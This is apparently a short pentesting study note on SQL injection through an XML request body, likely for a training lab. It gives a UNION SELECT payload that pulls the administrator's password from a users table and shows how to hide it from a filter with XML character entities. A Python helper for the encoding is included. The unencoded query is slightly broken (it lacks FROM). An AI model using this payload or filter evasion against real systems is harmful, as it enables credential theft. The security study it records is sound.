--- ---

<h2>XML</h2>

**Steps**
- Capture the request from BrupSuite (displaying some sort of XML)

- Find the number of column (You can simply guest from the output of the original request)

- trying to bypass some filter, you might see that simply encoding the request (URL might not work, this is because XML use a specific encoding (More information ---> [HERE](https://en.wikipedia.org/wiki/List_of_XML_and_HTML_character_entity_references)))
	- Also, here we are trying to encode character (this is different then simple url encoding)
	- Using (&#xCHARACTER;), we can see that SQL injection is valid

Query Example
```
#Not Encoded
4 UNION SELECT password WHERE username='administator'-- 

$Encoded
4&#x20;&#x55;NION&#x20;&#x53;ELECT&#x20;password&#x20;&#x46;ROM&#x20;users&#x20;&#x57;HERE&#x20;username=&#x27;administrator&#x27;&#x2D;&#x2D;&#x20;
```

---

<h2>Tool (Python)</h2>

XML encoder (Possible to modify it to encode character)
``` Python
import xml.sax.saxutils

# Define the string to be encoded
string = "this is a string to be XML encoded"

# Encode the string using the escape() method
encoded_string = xml.sax.saxutils.escape(string, {
    "'": "&#x27;",  # Single quote
    '"': "&#x22;",  # Double quote
    "&": "&#x26;",  # Ampersand
    "<": "&#x3c;",  # Less than
    ">": "&#x3e;",  # Greater than
    " ": "&#x20;"   # Space
})

# Print the encoded string
print(encoded_string)
```